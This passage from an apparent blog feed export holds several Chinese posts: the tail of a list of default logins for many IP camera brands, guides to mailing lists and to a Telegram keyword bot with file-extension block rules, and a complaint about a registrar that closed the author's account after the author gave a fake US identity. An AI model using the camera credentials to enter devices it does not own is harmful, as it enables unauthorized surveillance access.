admin/9999</p><p>Arecont Vision: none</p><p>Avigilon: admin/admin</p><p>Axis: traditionally root/pass, new Axis cameras require password creation during first login</p><p>Basler: admin/admin</p><p>Bosch: none</p><p>Brickcom: admin/admin</p><p>Canon: root/camera</p><p>Cisco: No default password, requires creation during first login</p><p>Dahua: admin/admin</p><p>Digital Watchdog: admin/admin</p><p>DRS: admin/1234</p><p>DVTel: Admin/1234</p><p>DynaColor: Admin/1234</p><p>FLIR: admin/fliradmin</p><p>Foscam: admin/</p><p>GeoVision: admin/admin</p><p>Grandstream: admin/admin</p><p>Hikvision: admin/12345</p><p>Honeywell: admin/1234</p><p>IQinVision: root/system</p><p>IPX-DDK: root/admin or root/Admin\</p><p>JVC: admin/jvc</p><p>March: Networks: admin/</p><p>Mobotix: admin/meinsm</p><p>Panasonic: admin/12345</p><p>Pelco Sarix: admin/admin</p><p>Pixord: admin/admin</p><p>Samsung Electronics: root/root or admin/4321</p><p>Samsung Techwin (old): admin/1111111</p><p>Samsung (new): admin/4321</p><p>Sanyo: admin/admin</p><p>Scallop: admin/password</p><p>Sentry360 (mini): admin/1234</p><p>Sentry360 (pro): none</p><p>Sony: admin/admin</p><p>Speco: admin/1234</p><p>Stardot: admin/admin</p><p>Starvedia: admin/</p><p>Trendnet: admin/admin</p><p>Toshiba: root/ikwd</p><p>VideoIQ: supervisor/supervisor</p><p>Vivotek: root/</p><p>Ubiquiti: ubnt/ubnt</p><p>Wodsee: admin/</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> scan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解邮件列表</title>
      <link href="/2019/learning-maillist.html"/>
      <url>/2019/learning-maillist.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前经常听说或者在新闻里见到邮件列表这个词，知道很多大佬，特别是计算机大佬、某某编程语言之父、某某操作系统之父等一堆大佬都在用邮件列表，就感到十分好奇。近期我特意上网搜索相关资料，亲身实践邮件列表的使用。</p></blockquote><h2 id="什么是邮件列表"><a href="#什么是邮件列表" class="headerlink" title="什么是邮件列表"></a>什么是邮件列表</h2><p>邮件列表（Mailing List）的起源可以追溯到1975年，是互联网上最早的社区形式之一，也是Internet上的一种重要工具，用于各种群体之间的信息交流和信息发布。</p><p>邮件列表根据不同作用分为不同形式，其实我们生活中也有接触和使用过邮件列表这个东东，只是自己不知道这个东西就要邮件列表而已。</p><h3 id="常见的邮件列表有六种形式"><a href="#常见的邮件列表有六种形式" class="headerlink" title="常见的邮件列表有六种形式"></a>常见的邮件列表有六种形式</h3><ul><li>电子刊物</li><li>新闻邮件</li><li>注册会员通讯</li><li>新产品通知</li><li>顾客服务/顾客关系邮件</li><li>顾客定制信息</li></ul><h3 id="根据不同的邮件分发方式，邮件列表可以分为两大类"><a href="#根据不同的邮件分发方式，邮件列表可以分为两大类" class="headerlink" title="根据不同的邮件分发方式，邮件列表可以分为两大类"></a>根据不同的邮件分发方式，邮件列表可以分为两大类</h3><ul><li>公告型(Announcement list)</li><li>讨论型(Discussion list)</li></ul><p><strong>公告型</strong> 顾名思义就是类似于公告板，管理员可以给邮件列表所有成员发送公告邮件，比如我们常见的 广告邮件、新闻邮件、通知邮件等。</p><p><strong>讨论型</strong> 通俗点讲，就是一堆人加入一个列表中，这个列表有一个公用的邮箱地址，你可以给这个邮箱地址发邮件，他会自动将邮件转发给列表中的每一个人，列表中的成员可以直接通过回复邮件参与讨论，讨论内容同样会被转发给每一个人。</p><p>公告型邮件列表我们在生活中经常用，不需要多说，这篇文章我们主要来实践 讨论型 邮件列表的使用。</p><blockquote><p>下面提到的邮件列表一词特指讨论型邮件列表</p></blockquote><h2 id="哪里用到邮件列表"><a href="#哪里用到邮件列表" class="headerlink" title="哪里用到邮件列表"></a>哪里用到邮件列表</h2><p>其实很多地方会用到邮件列表，特别是在计算机领域，很多大佬喜欢用，他们认为web论坛太多杂乱的东西，很难达到交流的目的，而即时通讯无法进入深入的交流，内容往往缺乏思考和谨慎。邮件就不一样了，发邮件我们往往会进行慎重思考，深思熟虑之后写一长篇文章，这样最有利于交流。</p><p>国内我们会看到QQ邮箱里有一个群邮件功能，其实这实质上就是一个讨论型邮件列表，有部分人能够充分利用起来，但是据我的观察，99.99%的群并没有有效的利用，而这个功能却沦为广告和病毒木马多发地，真是令人惋惜。</p><p>国外的邮件列表据我搜索，Google Group是一个大头，还有部分是自建的。</p><p>先来说一下自建的，国外部分较为出名的组织都是自建邮件列表服务，因为这些邮件都是大佬们讨论的珍贵宝藏，需要好好保存。国外一般使用 “mail archive”的方式，将这些邮件进行存盘保存以供查阅和搜索。</p><p>谷歌关键词“mail archive”可以搜到一些存档的邮件，同时我们也可以通过这个搜索到部分邮件列表的地址。</p><p>像debian、wikipedia等都有自己的邮件列表，还不是一个，往往按照分类有几十个不同的邮件列表。</p><p>一般的小组织不可能去自己搭建邮件列表服务，都会直接使用第三方提供的邮件列表服务。比较有名的是Google Group。第一次登陆我还以为是上世纪的网站，好老的样式，好老的设计风格。不过转念一想，这也正常，大家都用邮件交流，谁还闲着没事去看网站呀。</p><h2 id="如何使用邮件列表"><a href="#如何使用邮件列表" class="headerlink" title="如何使用邮件列表"></a>如何使用邮件列表</h2><p>接下来我们实践如何加入一个邮件列表、在邮件列表中发起讨论、参与邮件列表中已经发起的讨论、退出邮件列表等常用操作。</p><h3 id="加入邮件列表"><a href="#加入邮件列表" class="headerlink" title="加入邮件列表"></a>加入邮件列表</h3><p>加入一个邮件列表有两种方法，第一种方法是通过邮件列表服务网页填写自己的邮箱地址加入，另一种是比较正统的发邮件加入。</p><p>我们以 <a href="mailto:sdulug@googlegroups.com">sdulug@googlegroups.com</a> 这个邮件列表为例，演示如何加入它。</p><p>邮件列表往往有一个主邮箱地址，同时隐藏一些辅助的邮箱地址，这里我们就需要使用其中一个隐藏的邮箱地址 <a href="mailto:sdulug+subscribe@googlegroup.com">sdulug+subscribe@googlegroup.com</a></p><p>在googlegroup中订阅一个邮箱列表需要给 <a href="mailto:listname+subscribe@googlegroup.com">listname+subscribe@googlegroup.com</a> 这个邮箱地址发任意邮件，这里需要注意 是加号，发完邮件后就会收到相应的确认邮件，按照提示回复即可加入。</p><p>在一些其他的邮箱列表，加入方式可能稍微有些不同，有的是需要发送主题为 subscribe 的邮件才能订阅，同时订阅的邮箱地址不是加号subscribe，而是-subscribe，这里是减号。在加入之前你需要通过邮件列表的介绍页面查看订阅方法。</p><h3 id="发起讨论"><a href="#发起讨论" class="headerlink" title="发起讨论"></a>发起讨论</h3><p>在邮件列表中发起讨论非常简单，你只需要编辑好主题和内容，然后发送给公共的邮箱地址，例如 发送给 <a href="mailto:sdulug@googlegroup.com">sdulug@googlegroup.com</a>，邮件列表服务器就会将你的邮件发送给列表中的每一个邮箱地址。</p><p>###参与讨论</p><p>如果你收到一封邮件，想要参与讨论，你只需要回复这封邮件即可，一般情况下标题会自动重命名为 Re: 原标题、回复：原标题，同时正文内容中会附带之前的邮件内容。</p><p>如果你是用的邮箱系统不支持这个操作，建议切换Gmail。</p><blockquote><p>注意，观察你回复的是不是公共邮箱，只有这样其他人才能收到你的回复邮件。</p></blockquote><h3 id="退订邮件列表"><a href="#退订邮件列表" class="headerlink" title="退订邮件列表"></a>退订邮件列表</h3><p>与加入方式类似，需要将 subscribe换成unsubscribe.</p><h2 id="如何用好邮件列表"><a href="#如何用好邮件列表" class="headerlink" title="如何用好邮件列表"></a>如何用好邮件列表</h2><h3 id="Email格式合格"><a href="#Email格式合格" class="headerlink" title="Email格式合格"></a>Email格式合格</h3><ul><li>设置好签名档</li><li>公务邮箱应该包括姓名, 公司名称, 地址, 传真, 联系方式等</li><li>私人邮箱包括姓名(如经常与国外往来,应使用拼音或英文名), 邮箱地址, blog等必要信息.</li><li>清晰简明的标题，30字以内, 尽可能的包含5W1H</li><li>可以添加标签, 方便收件人客户端自动分类.如, 通知, 汇报等</li><li>抬头, 落款</li></ul><h3 id="内容表述清晰"><a href="#内容表述清晰" class="headerlink" title="内容表述清晰"></a>内容表述清晰</h3><ul><li>倒金字塔叙事</li><li>开头讲清楚概括大意, 讲清楚5W1H</li><li>慢慢展开，旁征博引</li><li>5W1H</li><li>who 谁</li><li>When 何时</li><li>Where 何地, 或什么过程中</li><li>What 遇到了什么问题</li><li>Why 为何会出现这个问题</li><li>How 如何,或进行过怎样的尝试, 以及其他方便他人理解问题的信息</li></ul><h3 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h3><h4 id="提问之前"><a href="#提问之前" class="headerlink" title="提问之前"></a>提问之前</h4><ul><li>Google it</li><li>询问精通此道的身边人</li><li>三思而后问</li></ul><h4 id="怎样提问"><a href="#怎样提问" class="headerlink" title="怎样提问"></a>怎样提问</h4><ul><li>语法正确, 拼写无误</li><li>精确描述, 信息量大</li><li>只说症状, 不说猜想</li><li>问题解决后要有简短声明</li><li>具体参见<a href="http://wiki.woodpecker.org.cn/moin/AskForHelp" target="_blank" rel="noopener">http://wiki.woodpecker.org.cn/moin/AskForHelp</a>…</li><li>附件文档请输出为pdf版</li></ul><h3 id="避免邮件中出现乱码"><a href="#避免邮件中出现乱码" class="headerlink" title="避免邮件中出现乱码"></a>避免邮件中出现乱码</h3><ul><li>使用utf-8编码, 不要使用GBK之类的编码.</li><li>避免中文标点</li></ul><h3 id="防止线索断了"><a href="#防止线索断了" class="headerlink" title="防止线索断了"></a>防止线索断了</h3><p>如果你回复的有问题，回复内容会被当做一个新的主题被发出，当别人说线索断了的时候注意检查是不是自己的邮件客户端有问题。</p><h2 id="一些邮件列表"><a href="#一些邮件列表" class="headerlink" title="一些邮件列表"></a>一些邮件列表</h2><p><a href="https://lists.wikimedia.org/mailman/listinfo" target="_blank" rel="noopener">https://lists.wikimedia.org/mailman/listinfo</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> maillist </tag>
            
            <tag> mail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Name的一次糟糕的体验</title>
      <link href="/2019/bad-experience-with-name.html"/>
      <url>/2019/bad-experience-with-name.html</url>
      
        <content type="html"><![CDATA[<p>这个事情发生在一个周以内，体验极其糟糕，特此记录一下。</p><h2 id="事情起因"><a href="#事情起因" class="headerlink" title="事情起因"></a>事情起因</h2><p>大半夜突发奇想想要买一个im的域名，通过域名比价网站Namebeta进行搜索，发现里面只有一个是我之前听说过的，Name.com在V2EX上经常看到有人提及和推荐，也就没有考虑价格最低的dynadot，直接注册了Name.com账号。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/bijia.png" loading="lazy" class="" title="[im后缀域名比价]"><p>登录Name网站后购买了lgf.im这个域名，续了5年，一次只能续期一年，分4次续上的。</p><p>想要使用这个域名做一个域名邮箱，不想自己搭建，就直接搜索免费的企业邮。</p><p>之前有使用过腾讯企业邮、网易企业邮、阿里云企业邮箱，用的都是免费版，体验最好的是腾讯企业邮，还支持域名下所有邮件转发到指定邮箱，如此就可以一个邮箱账号掌管全局了。</p><p>注册并登录上之后才发现，腾讯企业邮新版中这个功能竟然变成了收费功能，难受，收费价格还这么贵。</p><p>便上网搜索好用的企业邮，再比较各类企业邮之后，就想直接上付费的G Suite，又恰巧Name.com又半价的G Suite可以购买，便想直接在Name购买。</p><p>支付宝付款，很快便支付成功，然后进入G Suite商品设置界面，需要捆绑上G Suite需要使用的域名，这里选择了刚刚购买的域名，但是提示profile不能绑定该域名。具体提示词我也忘记了，当时没有截图。</p><p>既然不能用，那我就申请退款吧，就发了一个申请退款G Suite的工单，工单在当天半夜1点回复了我。工单中说明G Suite不支持中国，并且可以退款，当天晚不到2点钱就退回了支付宝，退款速度很快。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/refund1.png" loading="lazy" class="" title="[退款工单回复，提示中国区无法使用G Suite]"><p>第二天我就想，既然中国区的账号信息无法使用G Suite，那我改成美国的身份应该就可以了吧，所以找出我之前使用过的一个美国身份，修改账号信息。</p><p>然后重新购买了G Suite，这一次成功绑定，当天上午就将各种配置修改好，成功使用G Suite了。</p><p>本以为本次的购物就这么愉快的结束了，域名续了5年，G Suite也点了自动信用卡续费，可谁知坏消息当天中午就发生了。</p><h2 id="域名被删强制退款"><a href="#域名被删强制退款" class="headerlink" title="域名被删强制退款"></a>域名被删强制退款</h2><p>中午，接连收到了信用卡的短信通知和支付宝的通知推送，之前购买和续费域名的钱被退回来了。我就感觉莫名其妙，赶紧登陆账号查看发生了什么。</p><p>刚购买的域名被删了，连个邮件通知都没有，直接删域名退款。。。</p><p>我以为是昨天的申请G Suite退款的工单，工作人员搞错了，错误的把域名也给我退款了，赶紧发了一个工单进行询问。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/gongdan4.png" loading="lazy" class="" title="[登不进去账号，只能通过邮件截图之前发过的工单]"><p>等了好久也没有回复，想着晚上在看看吧。</p><h2 id="账号被封"><a href="#账号被封" class="headerlink" title="账号被封"></a>账号被封</h2><p>晚上回宿舍想要看一下工单进度，就发现登录不上name账号了。</p><p>点击立即重置密码发现并没有收到重置邮件，上网搜索相关信息后怀疑账号被封了。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/cantlogin.png" loading="lazy" class="" title="[账号被锁定]"><p>第二天上午，我收到了工单的回复，提示我需要再次验证账号身份。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/gongdan2.png" loading="lazy" class="" title="[工单回复要求验证账号身份（邮件太长只截图一部分）]"><p>WTF??</p><p>因为提了工单，所以就要锁我账号？就要更多我的个人隐私？？什么鬼！！</p><p>没办法，G Suite还没到期，后面可能还要用到name.com，所以就按照他的要求上传了各种信息。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/accountrecovermail.png" loading="lazy" class="" title="[意思就是继续等审核结果]"><p>第二天晚上，收到了最终回复，账号不予解封，白嫖我个人信息，气死了。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/result.png" loading="lazy" class="" title="[不予解封]"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>因为是正式开始使用dynadot了，就需要好好了解一下这个域名购买网站。</p><p>上网对其进行了搜索，后悔一开始没有选择dynadot，看各种评价，发现口碑很好，主要还很便宜。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/v2ex1.png" loading="lazy" class="" title="[v2ex上对于dynadot的评价]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/v2ex2.png" loading="lazy" class="" title="[v2ex上对于dynadot的评价]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/bijiao1.png" loading="lazy" class="" title="[域名转移相关的比较]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/bijiao2.png" loading="lazy" class="" title="[安全性相关的比较]"><p>据我自己的使用体验，只要国家设置成中国，语言中文，币种选择人民币，dynadot是支持支付宝和微信支付的，非常方便。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>dynadot一开始买的时候最多选3年，我想要一次性续5年，可是选择续费后返回一个错误，难不成最多只能续3年？？</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/bad-experience-with-name/error.png" loading="lazy" class="" title="[我点续费选项后也没让我选续费时长呀]"><p>先不管了，反正开了自动续费，还有3年，等到期了再说。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Name的这次体验让我感到极为不友好，体验炒鸡糟糕，烦！</p><p>但是反省自己，也不是没有错，审查归根到底还是因为我使用了虚假的美国身份。</p><p>现在越来越多的国外厂商针对中国人的审查变得越来越严，我认为这极大一部分原因是国内羊毛党太多，他们真的被薅怕了，迫不得已加强审查。</p><blockquote><p>后来我才听同学说，近期Name有活动，可以撸域名，沃日，难不成审查他们的虚假账号我倒霉的中枪了?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> name </tag>
            
            <tag> domain </tag>
            
            <tag> bad </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telegram 关键词机器人</title>
      <link href="/2019/telegram-keyword-reply-bot.html"/>
      <url>/2019/telegram-keyword-reply-bot.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>高中时期了解了telegram，大学期间正式开始使用。自己的频道最多的时候有上万人关注，聊天群组里人数也很多，但是时间久了我发现了一个问题。因为telegram在国内并不常用，新加入的成员往往都是新手，通常会问一些琐碎的、相似的问题，例如：如何汉化tg、+86号码无法私聊别人，等等相关的问题是在不想重复回答，便产生了制作一个关键词回复机器人的想法。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>下面简单说一下机器人实现的一些功能，具体还是推荐你亲身进行体验。</p><ul><li>首先为了满足最初的需求，机器人需要能够对特定关键词回复特定的文字内容。</li><li>为了能够更加灵活的匹配关键词，针对关键词识别增加了正则匹配方式的关键词识别方法，可以让用户能够编写更加灵活的关键词规则。</li><li>为了满足更加更多种类的回复内容，回复种类除了文字还增加了照片、动图、视频、文件、表情、Marddown等其他的回复种类，并且允许给图片、文件等添加描述信息。</li><li>为了满足部分群组的多样化回复需求，回复方式增加了 多个回复消息混合、多个回复类型混合、回复内容随机选择 等复杂但灵活的规则配置方式。</li><li>为了能够实现部分群管功能，回复类型增加了群管操作，包括 消息删除、消息置顶、人员禁言、人员踢出等功能，只需要设置相应的关键词回复规则即可。</li><li>除了关键词功能外，我还给机器人增加了群管命令、获取用户id信息、禁言游戏、加群欢迎、退群送别、一键呼叫所有管理员等功能。</li></ul><p>下面我将演示一些基本的功能配置和使用方法。</p><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>关键词规则的使用<br>添加规则使用 /add 关键词===回复内容<br>删除规则使用 /del 关键词<br>查看规则在群组里使用 /list  </p><h3 id="回复文本内容"><a href="#回复文本内容" class="headerlink" title="回复文本内容"></a>回复文本内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 汉化&#x3D;&#x3D;&#x3D;tg支持语言包功能，点击【链接】即可修改为中文。</span><br></pre></td></tr></table></figure><p>添加这条规则之后，机器人就会对每一条包含有“汉化”关键词的消息回复“tg支持语言包功能，点击【链接】即可修改为中文。”这个特定内容。</p><p>回复文字支持markdown语法，添加前缀 <code>md::</code> 即可使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/add testmd===md::加粗**bold**</span><br></pre></td></tr></table></figure><h3 id="回复图片"><a href="#回复图片" class="headerlink" title="回复图片"></a>回复图片</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 关键词&#x3D;&#x3D;&#x3D;photo::图片链接</span><br></pre></td></tr></table></figure><p>图片链接需要时互联网上tg服务器可以访问到的图片，可以是tg上公开群组或者频道的图片消息链接或者互联网上任意图片资源链接</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 小白兔&#x3D;&#x3D;&#x3D;photo::https:&#x2F;&#x2F;img.cdn.com&#x2F;tupian.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;add 小可爱&#x3D;&#x3D;&#x3D;photo::https:&#x2F;&#x2F;t.me&#x2F;peekfun&#x2F;1000</span><br></pre></td></tr></table></figure><h3 id="回复动图-视频-文件"><a href="#回复动图-视频-文件" class="headerlink" title="回复动图\视频\文件"></a>回复动图\视频\文件</h3><p>机器人除了回复图片外，还支持回复动图、视频、文件，如果你已经学会了回复图片，那这些种类也没有问题。</p><ul><li>动图 <code>/add 关键词===gif::动图链接</code></li><li>视频 <code>/add 关键词===video::视频链接</code></li><li>文件 <code>/add 关键词===file::文件链接</code></li></ul><p>需要注意的是，各种链接要么是tg上公开群组或者频道的链接（私有群组不行），要么是互联网上的资源链接，注意链接需要与发送的种类对应好。</p><h3 id="图片-文件添加文字"><a href="#图片-文件添加文字" class="headerlink" title="图片\文件添加文字"></a>图片\文件添加文字</h3><p>在手动发送图片等的时候我们可以添加描述信息，机器人回复规则也可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行</span><br><span class="line"></span><br><span class="line">&#x2F;add 关键词&#x3D;&#x3D;&#x3D;photo::图片链接::描述文字</span><br><span class="line"></span><br><span class="line">&#x2F;add 小白兔&#x3D;&#x3D;&#x3D;</span><br><span class="line">            photo::https:&#x2F;&#x2F;img.cdn.com&#x2F;tupian.jpg  ::</span><br><span class="line">            这里是描述文字，例如原来你也喜欢小白兔呀</span><br></pre></td></tr></table></figure><p>文件的使用也是类似，就不再重复</p><blockquote><p>注意：图片和文件的介绍文字默认开启markdown语法</p></blockquote><h3 id="正则表达式进行匹配"><a href="#正则表达式进行匹配" class="headerlink" title="正则表达式进行匹配"></a>正则表达式进行匹配</h3><p>现在你已经会使用关键词来回复特定内容了，但是为了更加灵活的回复，而不是令机器人看起来傻乎乎的<br>事实上机器人聪明与否完全看你设置的关键词规则是否灵活，你需要学习简单的正则表达式并且利用正则来进行匹配。</p><p>使用正则匹配非常简单，只需要将原来的关键词替换为 <code>re:正则规则</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add re:(如何|怎样).*(激活|使用)&#x3D;&#x3D;&#x3D;请查看这个说明</span><br></pre></td></tr></table></figure><p>在这个例子里面，使用了正则表达式进行了匹配，此时用户发送 “有谁知道怎样进行账号的激活吗？”也可以匹配上，这大大提高了规则的灵活性。</p><blockquote><p>需要说明的是，机器人的所有关键词使用方法均支持正则，你可以随意进行尝试。</p></blockquote><h3 id="一次回复多条消息"><a href="#一次回复多条消息" class="headerlink" title="一次回复多条消息"></a>一次回复多条消息</h3><p>有些时候一条消息无法满足回复的需求，需要机器人同时返回多个消息，这也是支持的。  </p><p>你只需要用 || 将多个回复内容间隔开就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 关键词&#x3D;&#x3D;&#x3D;回复文字1||回复文字2||回复文字3</span><br></pre></td></tr></table></figure><p>不同种类的回复内容也可以混合在一起，请随意混搭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行</span><br><span class="line">&#x2F;add 关键词&#x3D;&#x3D;&#x3D;</span><br><span class="line">            请欣赏  ||</span><br><span class="line">            photo::图片链接  ||</span><br><span class="line">            video::视频链接  ||</span><br><span class="line">            如果需要更多内容，你可以下载软件  ||</span><br><span class="line">            file::文件链接</span><br></pre></td></tr></table></figure><h3 id="回复随机消息"><a href="#回复随机消息" class="headerlink" title="回复随机消息"></a>回复随机消息</h3><p>有一个群组提出了这样一个特定需求，想要从设置好的回复内容中随机回复一个，这也是支持的。  </p><p>使用方法：<br>random{回复内容1$$回复内容2$$回复内容3}，使用两个英文的$符号间隔。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行</span><br><span class="line">&#x2F;add 关键词&#x3D;&#x3D;&#x3D;</span><br><span class="line">            random::&#123;</span><br><span class="line">                一条消息  $$</span><br><span class="line">                photo::PHOTO_URL  $$</span><br><span class="line">                另一条消息</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>在这个关键词规则里，机器人将自动从三条消息中选择一个发出。</p><p>你可以结合上面一个使用方法，让规则更加灵活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行</span><br><span class="line">&#x2F;add 小白兔&#x3D;&#x3D;&#x3D;</span><br><span class="line">            你也喜欢小白兔呀，送你一张小白兔的照片  ||</span><br><span class="line">            random::&#123;</span><br><span class="line">                photo::照片链接1 $$</span><br><span class="line">                photo::照片链接2 $$</span><br><span class="line">                photo::照片链接3</span><br><span class="line">            &#125;  ||</span><br><span class="line">            如果喜欢可以下载软件获取更多图片  ||</span><br><span class="line">            file::文件的链接</span><br></pre></td></tr></table></figure><h3 id="自动删除消息"><a href="#自动删除消息" class="headerlink" title="自动删除消息"></a>自动删除消息</h3><p>大多数时候我们需要屏蔽一些关键词，防止用户讨论相关内容，比如说政治、色情、黑产等内容。<br>机器人既然可以识别关键词，就可以进行相关消息删除操作，你需要给机器人删除消息的管理员权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 日站&#x3D;&#x3D;&#x3D;delete</span><br></pre></td></tr></table></figure><p>这样机器人就会将含有 日站 二字的消息自动删除，起到屏蔽的作用，你可以使用正则进行更加灵活的匹配。</p><p>直接删除可能不太友好，你可以结合前面的内容进行优化，比如结合多个回复内容进行添加提示语。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add 日站&#x3D;&#x3D;&#x3D;本群禁止讨论黑产相关内容||delete</span><br></pre></td></tr></table></figure><p>这样的规则机器人就会先回复“本群禁止讨论黑产相关内容”，然后再进行删除。</p><blockquote><p>注意：delete一定要放在最后，否则回复消息发送不出来。</p></blockquote><h3 id="自动禁言-踢人"><a href="#自动禁言-踢人" class="headerlink" title="自动禁言\踢人"></a>自动禁言\踢人</h3><p>只删除还不过瘾，有人刷消息？禁言和踢人同样支持。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">禁言</span><br><span class="line">/add keyword===ban</span><br><span class="line">会自动禁言发送keyword的用户 永久</span><br><span class="line"></span><br><span class="line">禁言特定时长</span><br><span class="line">/add keyword===ban::3d6h20m36s</span><br><span class="line">会自动禁言发送keyword的用户 3天6个小时20分钟36s</span><br><span class="line">时长信息4个时间单位不必全部写满，时长换算成秒如果低于30s意味着永久禁言，多于1年也是永久禁言</span><br><span class="line"></span><br><span class="line">踢人</span><br><span class="line">/add 日站===kick</span><br></pre></td></tr></table></figure><p>你还是可以结合上面的内容进行优化，因为delete、ban、kick也是回复种类之一，所以跟文字、照片、视频、文件等的使用方法相同，也就可以进行组合。</p><h3 id="屏蔽特定后缀文件"><a href="#屏蔽特定后缀文件" class="headerlink" title="屏蔽特定后缀文件"></a>屏蔽特定后缀文件</h3><p>有人发送exe\com\bat等后缀的病毒？不用再去找其他机器人了，使用自定义规则即可完成屏蔽和禁言。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add re:(\.exe|\.scr|\.cpl|\.com|\.cmd|\.bat|\.vbs)$&#x3D;&#x3D;&#x3D;ban</span><br></pre></td></tr></table></figure><p>这样带有exe\src\cpl\com\cmd\bat\vbs等可执行后缀的文件就会被自动删除，相关发送者就会被禁言。</p><blockquote><p>关键词功能可以根据每个群组添加的不同的关键词规则实现一些简单的回复或者更加复杂的操作，通过组合等方式来实现相应功能完全看你的规则，所以发挥你的脑洞吧。</p></blockquote><h3 id="进群欢迎和退群欢送"><a href="#进群欢迎和退群欢送" class="headerlink" title="进群欢迎和退群欢送"></a>进群欢迎和退群欢送</h3><p>机器人可以设置欢迎和欢送文字</p><p>需要使用 <code>/welcome</code> 和 <code>/goodbye</code> 命令分别开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/welcome</span><br><span class="line">开启后，可以设置内容</span><br><span class="line">/setwelcometext 欢迎 <span class="variable">$username</span> 加入 <span class="variable">$groupname</span> 这个大家庭</span><br><span class="line"></span><br><span class="line">/goodbye</span><br><span 